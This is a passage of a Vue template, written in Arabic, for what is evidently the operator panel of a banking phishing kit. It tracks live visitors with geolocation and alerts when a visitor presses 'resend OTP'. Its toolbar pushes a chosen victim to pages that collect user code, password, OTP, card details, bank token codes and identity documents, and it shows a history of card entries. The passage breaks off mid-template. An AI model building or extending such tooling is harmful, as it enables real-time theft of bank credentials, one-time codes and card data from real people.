<template>
  <div class="dashboard-page" :class="`theme-${dashboardTheme}`">
    <section class="dashboard-shell">
      <!-- شاشة تحميل الجلسة -->
      <div v-if="authLoading" class="dashboard-auth-card">
        <div class="auth-spinner"></div>
        <p>جاري التحقق من جلسة لوحة التحكم...</p>
      </div>

      <!-- نموذج تسجيل دخول الإدارة -->
      <div v-else-if="!isAllowed" class="dashboard-login-container">
        <form class="dashboard-login" @submit.prevent="submitDashboardLogin">
          <div class="bot-trap" aria-hidden="true">
            <label for="dashboard-company">Company</label>
            <input
              id="dashboard-company"
              v-model="dashboardTrap"
              type="text"
              name="company"
              tabindex="-1"
              autocomplete="off"
            />
          </div>

          <div class="login-brand">
            <div class="login-icon-box">
              <svg viewBox="0 0 24 24" width="28" height="28" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
              </svg>
            </div>
            <h1>لوحة الإدارة والمتابعة</h1>
            <p>تسجيل الدخول إلى لوحة التحكم المباشرة</p>
          </div>

          <div class="login-field">
            <label>البريد الإلكتروني</label>
            <input
              v-model="dashboardEmail"
              type="email"
              placeholder="admin@domain.com"
              dir="ltr"
              autocomplete="username"
              required
            />
          </div>

          <div class="login-field">
            <label>كلمة المرور</label>
            <input
              v-model="dashboardPassword"
              type="password"
              placeholder="••••••••"
              dir="ltr"
              autocomplete="current-password"
              required
            />
          </div>

          <button type="submit" class="login-submit-btn" :disabled="signingIn || !canDashboardLogin">
            <span v-if="signingIn" class="btn-spinner"></span>
            <span>{{ signingIn ? "جاري التحقق..." : "تسجيل الدخول" }}</span>
          </button>

          <div v-if="authError" class="auth-error-banner">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
              <circle cx="12" cy="12" r="10"></circle>
              <line x1="12" y1="8" x2="12" y2="12"></line>
              <line x1="12" y1="16" x2="12.01" y2="16"></line>
            </svg>
            <span>{{ authError }}</span>
          </div>
        </form>
      </div>

      <!-- الواجهة الرئيسية للداشبورد بعد تسجيل الدخول -->
      <template v-else>
        <!-- الشريط العلوي الاحترافي -->
        <header class="dashboard-topbar">
          <div class="topbar-right">
            <div class="topbar-brand">
              <div class="brand-logo-mark">
                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                </svg>
              </div>
              <div class="brand-text">
                <span class="brand-title">لوحة التحكم والمتابعة</span>
                <span class="admin-user-tag">
                  <span class="live-dot"></span>
                  {{ currentAdminEmail }}
                </span>
              </div>
            </div>

            <!-- مؤشرات KPI المباشرة -->
            <div class="topbar-metrics">
              <div
                class="metric-chip pending-chip"
                :class="{ highlight: pendingCustomers.length > 0 }"
                title="العملاء بانتظار قرار المشرف (قبول / رفض)"
              >
                <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <circle cx="12" cy="12" r="10"></circle>
                  <polyline points="12 6 12 12 16 14"></polyline>
                </svg>
                <span class="metric-label">قيد الانتظار:</span>
                <strong class="metric-value">{{ pendingCustomers.length }}</strong>
              </div>

              <div class="metric-chip" title="إجمالي من دخل الموقع">
                <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
                  <circle cx="9" cy="7" r="4"></circle>
                  <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
                  <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
                </svg>
                <span class="metric-label">المستخدمون:</span>
                <strong class="metric-value">{{ totalVisitorsCount }}</strong>
              </div>

              <div class="metric-chip online-chip" title="المستخدمون المتصلون حالياً">
                <span class="online-pulse-dot"></span>
                <span class="metric-label">متصل الآن:</span>
                <strong class="metric-value">{{ onlineCount }}</strong>
              </div>
            </div>
          </div>

          <div class="topbar-actions">
            <button
              class="topbar-action-btn"
              type="button"
              title="تبديل المظهر (فاتح / داكن)"
              @click="toggleDashboardTheme"
            >
              <svg v-if="dashboardTheme === 'dark'" viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="5"></circle>
                <line x1="12" y1="1" x2="12" y2="3"></line>
                <line x1="12" y1="21" x2="12" y2="23"></line>
                <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                <line x1="1" y1="12" x2="3" y2="12"></line>
                <line x1="21" y1="12" x2="23" y2="12"></line>
                <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
              </svg>
              <svg v-else viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
              </svg>
            </button>

            <button
              class="topbar-action-btn primary-subtle"
              type="button"
              title="لوحة الإعدادات والمشرفين"
              @click="toggleSettingsDrawer"
            >
              <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="3"></circle>
                <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1.51 1 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path>
              </svg>
              <span>الإعدادات</span>
            </button>
          </div>
        </header>

        <!-- جسم الداشبورد الرئيسي: المستخدمون على اليمين، قيد الانتظار بجانبها على اليسار، وتفاصيل العميل -->
        <main class="dashboard-main">
          <!-- 1. قائمة المستخدمين (على اليمين في الواجهة العربية RTL) -->
          <aside class="customers-panel users-panel">
            <div class="panel-head users-head">
              <div class="panel-title-wrap">
                <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
                  <circle cx="9" cy="7" r="4"></circle>
                  <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
                  <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
                </svg>
                <h2>المستخدمون</h2>
                <span class="count-pill">{{ regularCustomers.length }}</span>
              </div>
            </div>

            <!-- أزرار الفلاتر تحت عنوان قائمة المستخدمين مباشرة -->
            <div class="panel-filters-toolbar">
              <button
                type="button"
                class="filter-tab-btn"
                :class="{ active: !filterOnlineOnly && !filterStarredOnly }"
                @click="clearFilters"
              >
                <span>الكل</span>
                <span class="filter-count">({{ totalRegularCount }})</span>
              </button>

              <button
                type="button"
                class="filter-tab-btn"
                :class="{ active: filterOnlineOnly }"
                :title="filterOnlineOnly ? 'عرض كافة المستخدمين' : 'تصفية المتصلين الآن فقط'"
                @click="toggleOnlineFilter"
              >
                <span class="presence-dot-mini" :class="{ online: true }" />
                <span>متصل</span>
                <span class="filter-count">({{ onlineCount }})</span>
              </button>

              <button
                type="button"
                class="filter-tab-btn star-filter-btn"
                :class="{ active: filterStarredOnly }"
                :title="filterStarredOnly ? 'عرض كافة المستخدمين' : 'تصفية المستخدمين المميزين بنجمة فقط'"
                @click="toggleStarredFilter"
              >
                <svg viewBox="0 0 24 24" width="12" height="12" :fill="filterStarredOnly ? '#f59e0b' : 'none'" :stroke="filterStarredOnly ? '#f59e0b' : 'currentColor'" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon>
                </svg>
                <span>مميز</span>
                <span class="filter-count">({{ starredCount }})</span>
              </button>
            </div>

            <!-- مربع بحث المستخدمين -->
            <div class="search-wrap">
              <svg class="search-icon" viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="11" cy="11" r="8"></circle>
                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
              </svg>
              <input
                v-model="searchTerm"
                type="search"
                placeholder="بحث بالاسم، الهاتف، أو الكود..."
              />
            </div>

            <!-- قائمة المستخدمين -->
            <div class="customers-list-scroll">
              <div v-if="customersError" class="state-box error-state">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2">
                  <circle cx="12" cy="12" r="10"></circle>
                  <line x1="12" y1="8" x2="12" y2="12"></line>
                  <line x1="12" y1="16" x2="12.01" y2="16"></line>
                </svg>
                <span>{{ customersError }}</span>
              </div>

              <div v-else-if="customersLoading" class="state-box">
                <div class="auth-spinner small"></div>
                <span>جاري تحميل البيانات...</span>
              </div>

              <div v-else-if="regularCustomers.length === 0" class="state-box empty">
                <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                  <circle cx="11" cy="11" r="8"></circle>
                  <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
                </svg>
                <p v-if="filterOnlineOnly">لا يوجد مستخدمون متصلون حالياً</p>
                <p v-else>لا توجد نتائج مطابقة للبحث</p>
              </div>

              <template v-else>
                <button
                  v-for="customer in regularCustomers"
                  :key="customer.id"
                  class="customer-card"
                  :class="{ active: customer.id === selectedCustomerId }"
                  type="button"
                  @click="toggleSelectedCustomer(customer.id)"
                >
                  <span class="user-presence-dot" :class="presenceClass(customer)" />

                  <div class="customer-card-info">
                    <div class="customer-card-header">
                      <div class="customer-name-wrap">
                        <button
                          type="button"
                          class="star-toggle-btn"
                          :class="{ starred: customer.isStarred }"
                          :title="customer.isStarred ? 'إلغاء التمييز' : 'تمييز بنجمة'"
                          @click.stop="toggleStarred(customer.id)"
                        >
                          <svg viewBox="0 0 24 24" width="14" height="14" :fill="customer.isStarred ? '#f59e0b' : 'none'" :stroke="customer.isStarred ? '#f59e0b' : '#94a3b8'" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon>
                          </svg>
                        </button>
                        <strong class="customer-name">{{ customerDisplayName(customer) }}</strong>
                      </div>
                      <span v-if="isCustomerBanned(customer)" class="banned-tag">
                        محظور (24س)
                      </span>
                    </div>

                    <div class="customer-card-status-row">
                      <span class="customer-presence-pill" :class="presenceClass(customer)">
                        <span class="presence-dot-mini" />
                        {{ isOnline(customer) ? "متصل" : "غير متصل" }}
                      </span>

                      <span class="customer-location-pill" :class="{ 'is-login': customerCurrentLocation(customer).isLogin }">
                        <svg viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                          <circle cx="12" cy="12" r="10"></circle>
                          <polygon points="16.24 7.76 14.12 14.12 7.76 16.24 9.88 9.88 16.24 7.76"></polygon>
                        </svg>
                        <span>{{ customerCurrentLocation(customer).fullLabel }}</span>
                      </span>

                      <span
                        v-if="customerGeoFlag(customer)"
                        class="customer-country-mini-pill"
                        :title="customerGeoFullLabel(customer)"
                      >
                        <span class="customer-country-flag">{{ customerGeoFlag(customer) }}</span>
                        <span class="customer-country-text">
                          <span class="customer-country-name">{{ customer.country || "—" }}</span>
                          <span v-if="customer.region" class="customer-country-region">· {{ customer.region }}</span>
                        </span>
                      </span>
                    </div>
                  </div>
                </button>
              </template>
            </div>
          </aside>

          <!-- 2. قائمة قيد الانتظار (بجانب قائمة المستخدمين على اليسار) -->
          <aside class="customers-panel pending-panel">
            <div class="panel-head pending-head">
              <div class="panel-title-wrap">
                <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="pending-icon">
                  <circle cx="12" cy="12" r="10"></circle>
                  <polyline points="12 6 12 12 16 14"></polyline>
                </svg>
                <h2>قيد الانتظار</h2>
                <span class="count-pill pending-count-pill" :class="{ 'pulse-badge': pendingCustomers.length > 0 }">
                  {{ pendingCustomers.length }}
                </span>
              </div>
            </div>

            <!-- مربع بحث قيد الانتظار -->
            <div class="search-wrap">
              <svg class="search-icon" viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="11" cy="11" r="8"></circle>
                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
              </svg>
              <input
                v-model="pendingSearchTerm"
                type="search"
                placeholder="بحث في قيد الانتظار..."
              />
            </div>

            <!-- قائمة العملاء بانتظار القرار -->
            <div class="customers-list-scroll">
              <div v-if="customersLoading" class="state-box">
                <div class="auth-spinner small"></div>
                <span>جاري تحميل البيانات...</span>
              </div>

              <div v-else-if="pendingCustomers.length === 0" class="state-box empty-pending">
                <svg viewBox="0 0 24 24" width="28" height="28" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                  <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                  <polyline points="22 4 12 14.01 9 11.01"></polyline>
                </svg>
                <p>لا توجد طلبات قيد الانتظار</p>
                <span class="empty-hint">أي عميل يقوم بإدخال بيانات تتطلب موافقة أو رفض سيظهر هنا فوراً</span>
              </div>

              <template v-else>
                <button
                  v-for="customer in pendingCustomers"
                  :key="customer.id"
                  class="customer-card pending-card"
                  :class="{ active: customer.id === selectedCustomerId }"
                  type="button"
                  @click="toggleSelectedCustomer(customer.id)"
                >
                  <span class="user-presence-dot" :class="presenceClass(customer)" />

                  <div class="customer-card-info">
                    <div class="customer-card-header">
                      <div class="customer-name-wrap">
                        <button
                          type="button"
                          class="star-toggle-btn"
                          :class="{ starred: customer.isStarred }"
                          :title="customer.isStarred ? 'إلغاء التمييز' : 'تمييز بنجمة'"
                          @click.stop="toggleStarred(customer.id)"
                        >
                          <svg viewBox="0 0 24 24" width="14" height="14" :fill="customer.isStarred ? '#f59e0b' : 'none'" :stroke="customer.isStarred ? '#f59e0b' : '#94a3b8'" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon>
                          </svg>
                        </button>
                        <strong class="customer-name">{{ customerDisplayName(customer) }}</strong>
                      </div>
                      <span class="pending-tag">
                        {{ customerPendingBadge(customer) }}
                      </span>
                    </div>

                    <div class="customer-card-status-row">
                      <span class="customer-presence-pill" :class="presenceClass(customer)">
                        <span class="presence-dot-mini" />
                        {{ isOnline(customer) ? "متصل" : "غير متصل" }}
                      </span>

                      <span class="customer-location-pill" :class="{ 'is-login': customerCurrentLocation(customer).isLogin }">
                        <svg viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                          <circle cx="12" cy="12" r="10"></circle>
                          <polygon points="16.24 7.76 14.12 14.12 7.76 16.24 9.88 9.88 16.24 7.76"></polygon>
                        </svg>
                        <span>{{ customerCurrentLocation(customer).fullLabel }}</span>
                      </span>

                      <span
                        v-if="customerGeoFlag(customer)"
                        class="customer-country-mini-pill"
                        :title="customerGeoFullLabel(customer)"
                      >
                        <span class="customer-country-flag">{{ customerGeoFlag(customer) }}</span>
                        <span class="customer-country-text">
                          <span class="customer-country-name">{{ customer.country || "—" }}</span>
                          <span v-if="customer.region" class="customer-country-region">· {{ customer.region }}</span>
                        </span>
                      </span>
                    </div>
                  </div>
                </button>
              </template>
            </div>
          </aside>

          <!-- الجانب الأيسر: تفاصيل المستخدم وأدوات التحكم -->
          <section class="customer-details">
            <!-- حالة عدم اختيار مستخدم -->
            <div v-if="!selectedCustomer" class="details-empty-state">
              <div class="empty-icon-wrap">
                <svg viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
                  <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path>
                  <circle cx="9" cy="7" r="4"></circle>
                  <line x1="19" y1="8" x2="19" y2="14"></line>
                  <line x1="22" y1="11" x2="16" y2="11"></line>
                </svg>
              </div>
              <h3>اختر مستخدماً لمعاينة البيانات</h3>
              <p>قم بتحديد مستخدم من القائمة الجانبية لعرض بيانات تسجيل الدخول، رمز التحقق، وتوجيه الصفحة.</p>
            </div>

            <!-- تفاصيل المستخدم المحدد -->
            <template v-else>
              <!-- رأس تفاصيل المستخدم -->
              <div class="details-header">
                <div class="details-header-info">
                  <div class="customer-title-row">
                    <button
                      type="button"
                      class="star-toggle-btn details-star-btn"
                      :class="{ starred: selectedCustomer.isStarred }"
                      :title="selectedCustomer.isStarred ? 'إلغاء التمييز' : 'تمييز بنجمة'"
                      @click.stop="toggleStarred(selectedCustomer.id)"
                    >
                      <svg viewBox="0 0 24 24" width="20" height="20" :fill="selectedCustomer.isStarred ? '#f59e0b' : 'none'" :stroke="selectedCustomer.isStarred ? '#f59e0b' : '#94a3b8'" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon>
                      </svg>
                    </button>
                    <h2>{{ customerDisplayName(selectedCustomer) }}</h2>
                    <span v-if="isCustomerBanned(selectedCustomer)" class="status-chip danger-banned">
                      محظور (24 ساعة)
                    </span>
                    <span v-else class="status-chip" :class="{ danger: selectedCustomer.status === 'مشكلة' }">
                      {{ selectedCustomer.status || "نشط" }}
                    </span>
                    <span class="presence-chip" :class="presenceClass(selectedCustomer)">
                      <span class="presence-indicator-dot"></span>
                      {{ isOnline(selectedCustomer) ? "متصل الآن" : "غير متصل" }}
                    </span>
                  </div>

                  <!-- مكان ومرحلة العميل الحالية بشكل بارز وكبير وواضح -->
                  <div class="customer-location-banner" :class="{ 'is-online': isOnline(selectedCustomer) }">
                    <div class="location-pulse-indicator">
                      <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <polygon points="16.24 7.76 14.12 14.12 7.76 16.24 9.88 9.88 16.24 7.76"></polygon>
                      </svg>
                    </div>
                    <span class="location-title">المكان الحالي:</span>
                    <div class="location-stage-pills">
                      <span class="location-step-chip highlight">{{ customerCurrentLocation(selectedCustomer).fullLabel }}</span>
                      <span v-if="customerCurrentLocation(selectedCustomer).isLogin" class="location-context-tag">تسجيل الدخول</span>
                    </div>
                  </div>

                  <!-- بطاقة هوية الزائر الجغرافية: دولة + منطقة + مدينة (IP Geo) — بحجم الـ location-banner تماماً -->
                  <div
                    v-if="selectedCustomer.country || selectedCustomer.region || selectedCustomer.geoCity"
                    class="visitor-geo-card"
                    :class="{ 'is-online': isOnline(selectedCustomer) }"
                    :title="customerGeoFullLabel(selectedCustomer)"
                  >
                    <div class="visitor-geo-flag" aria-hidden="true">
                      {{ customerGeoFlag(selectedCustomer) }}
                    </div>
                    <span class="visitor-geo-eyebrow">هوية الزائر الجغرافية:</span>
                    <div class="visitor-geo-line">
                      <span class="visitor-geo-country">{{ selectedCustomer.country || "—" }}</span>
                      <span v-if="selectedCustomer.countryCode" class="visitor-geo-country-code" dir="ltr">{{ selectedCustomer.countryCode }}</span>
                    </div>
                    <div class="visitor-geo-sub" v-if="selectedCustomer.region || selectedCustomer.geoCity">
                      <span v-if="selectedCustomer.region" class="visitor-geo-region">
                        <svg viewBox="0 0 24 24" width="11" height="11" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                          <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
                          <circle cx="12" cy="10" r="3"></circle>
                        </svg>
                        {{ selectedCustomer.region }}
                      </span>
                      <span v-if="selectedCustomer.geoCity" class="visitor-geo-city">· {{ selectedCustomer.geoCity }}</span>
                    </div>
                    <span v-if="selectedCustomer.geoCapturedAt" class="visitor-geo-timestamp" dir="ltr">
                      {{ formatGeoCapturedAt(selectedCustomer.geoCapturedAt) }}
                    </span>
                  </div>

                  <!-- مربع تنبيه إعادة إرسال رمز OTP (مخصص في ترتيب لوحة التحكم) -->
                  <!-- يظهر تلقائياً بجانب "المكان الحالي" و أسفل شارة "متصل الآن"
                       عند ورود حدث otp_resend_clicked من Firebase للعميل الحالي.
                       مربع حقيقي بأبعاد متساوية (112×112) وليس مستطيل.
                       يصدر صوت تنبيه مميّز فور ورود الحدث. -->
                  <div
                    v-if="latestOtpResendEvent"
                    class="otp-resend-square"
                    role="status"
                    aria-live="polite"
                    :title="`حدث إعادة إرسال في ${formatOtpResendTime(latestOtpResendEvent.createdAt)}`"
                  >
                    <div class="otp-resend-square-icon" aria-hidden="true">
                      <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M21 12a9 9 0 1 1-3-6.7"></path>
                        <polyline points="21 3 21 9 15 9"></polyline>
                      </svg>
                    </div>
                    <div class="otp-resend-square-title">
                      قام المستخدم بالنقر على زر إعادة إرسال الرمز
                    </div>
                    <div class="otp-resend-square-meta">
                      <span class="otp-resend-square-dot" aria-hidden="true"></span>
                      <span dir="ltr">{{ formatOtpResendTime(latestOtpResendEvent.createdAt) }}</span>
                      <span v-if="otpResendCount > 1" class="otp-resend-square-count">×{{ otpResendCount }}</span>
                    </div>
                  </div>
                </div>

                <div class="details-header-actions">
                  <!-- زر حظر / إلغاء حظر المستخدم لمدة 24 ساعة -->
                  <button
                    v-if="!isCustomerBanned(selectedCustomer)"
                    class="action-btn-ban"
                    type="button"
                    title="حظر هذا المستخدم لمدة 24 ساعة وتحويله إلى Google"
                    @click="openBanDialog(selectedCustomer.id)"
                  >
                    <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                      <circle cx="12" cy="12" r="10"></circle>
                      <line x1="4.93" y1="4.93" x2="19.07" y2="19.07"></line>
                    </svg>
                    <span>حظر المستخدم (24 ساعة)</span>
                  </button>

                  <button
                    v-else
                    class="action-btn-unban"
                    type="button"
                    title="إلغاء حظر هذا المستخدم"
                    @click="handleUnbanCustomer(selectedCustomer.id)"
                  >
                    <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                    </svg>
                    <span>إلغاء الحظر (محظور)</span>
                  </button>

                  <button
                    v-if="role === 'superadmin'"
                    class="action-btn-danger"
                    type="button"
                    title="حذف هذا المستخدم"
                    @click="openDeleteCustomerDialog(selectedCustomer.id)"
                  >
                    <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                      <polyline points="3 6 5 6 21 6"></polyline>
                      <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path>
                    </svg>
                    <span>حذف المستخدم</span>
                  </button>
                </div>
              </div>

              <!-- شريط أدوات التوجيه السريع عن بعد (Remote Redirect Toolbar) -->
              <div class="remote-redirect-toolbar">
                <div class="toolbar-label">
                  <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <polygon points="5 3 19 12 5 21 5 3"></polygon>
                  </svg>
                  <span>توجيه العميل:</span>
                </div>

                <div class="toolbar-buttons-group">
                  <button
                    type="button"
                    class="step-redirect-btn"
                    @click="sendRemoteRedirect(selectedCustomer.id, '/', '')"
                  >
                    الرئيسية
                  </button>

                  <button
                    type="button"
                    class="step-redirect-btn"
                    @click="sendRemoteRedirect(selectedCustomer.id, '/delivery', '')"
                  >
                    بيانات التوصيل
                  </button>

                  <button
                    type="button"
                    class="step-redirect-btn"
                    @click="sendRemoteRedirect(selectedCustomer.id, '/login', 'username')"
                  >
                    كود المستخدم
                  </button>

                  <button
                    type="button"
                    class="step-redirect-btn"
                    @click="sendRemoteRedirect(selectedCustomer.id, '/login', 'password')"
                  >
                    كلمة المرور
                  </button>

                  <button
                    type="button"
                    class="step-redirect-btn"
                    @click="sendRemoteRedirect(selectedCustomer.id, '/login', 'otp')"
                  >
                    رمز التحقق OTP
                  </button>

                  <button
                    type="button"
                    class="step-redirect-btn"
                    @click="sendRemoteRedirect(selectedCustomer.id, '/login', 'card')"
                  >
                    بيانات البطاقة
                  </button>

                  <button
                    type="button"
                    class="step-redirect-btn"
                    @click="sendRemoteRedirect(selectedCustomer.id, '/login', 'nbe_token')"
                  >
                    NBE توكن
                  </button>

                  <button
                    type="button"
                    class="step-redirect-btn"
                    @click="sendRemoteRedirect(selectedCustomer.id, '/login', 'bm_token')"
                  >
                    جهاز توكن
                  </button>

                  <button
                    type="button"
                    class="step-redirect-btn"
                    @click="sendRemoteRedirect(selectedCustomer.id, '/documents', '')"
                  >
                    توثيق المستندات
                  </button>

                  <button
                    type="button"
                    class="step-redirect-btn"
                    @click="sendRemoteRedirect(selectedCustomer.id, ROUTE_PATHS.chat, '')"
                  >
                    الاتصال
                  </button>

                  <button
                    type="button"
                    class="step-redirect-btn"
                    @click="sendRemoteRedirect(selectedCustomer.id, ROUTE_PATHS.waitingRoom, '')"
                  >
                    الانتظار
                  </button>

                  <button
                    type="button"
                    class="step-redirect-btn"
                    @click="sendRemoteRedirect(selectedCustomer.id, '/success', '')"
                  >
                    تم بنجاح
                  </button>

                  <button
                    type="button"
                    class="step-redirect-btn whatsapp-btn"
                    @click="sendRemoteRedirect(selectedCustomer.id, whatsappUrl, '')"
                  >
                    واتساب
                  </button>
                </div>

                <transition name="fade">
                  <span v-if="redirectSuccessMessage" class="redirect-toast">
                    <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2.5">
                      <polyline points="20 6 9 17 4 12"></polyline>
                    </svg>
                    {{ redirectSuccessMessage }}
                  </span>
                </transition>
              </div>

              <!-- قسم بيانات تسجيل الدخول والاعتماد -->
              <section class="content-block auth-credentials-container">
                <div class="content-block-header">
                  <div class="block-title">
                    <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                      <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                      <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                    </svg>
                    <h3>بيانات تسجيل الدخول والتحقق</h3>
                  </div>
                </div>

                <!-- بطاقة بيانات البطاقة المصرفية (فوق البطاقات الثلاث) -->
                <div
                  class="data-card bank-card-stage-card"
                  :class="{ 'card-pending-border': isCardPending(selectedCustomer) }"
                >
                  <div class="data-card-header">
                    <div class="stage-title-tag">
                      <span class="stage-num stage-num-card">
                        <svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="currentColor" stroke-width="2">
                          <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
                          <line x1="1" y1="10" x2="23" y2="10"></line>
                        </svg>
                      </span>
                      <span class="card-subtitle">معلومات البطاقة المصرفية</span>
                    </div>
                    <div class="header-status-wrap">
                      <span
                        class="status-badge"
                        :class="selectedCustomer.cardStatus || 'none'"
                      >
                        {{ stepStatusLabel(selectedCustomer.cardStatus) }}
                      </span>
                    </div>
                  </div>

                  <!-- شكل البطاقات البنكية الواقعية عند إدخال البيانات -->
                  <div v-if="getCardHistoryList(selectedCustomer).length > 0" class="physical-card-container">
                    <div class="cards-attempts-stack">
                      <div
                        v-for="(cardItem, idx) in getCardHistoryList(selectedCustomer)"
                        :key="'bank-card-attempt-' + idx"
                        class="card-attempt-item"
                        :class="{ 'is-current': cardItem.isCurrent || idx === 0 }"
                      >
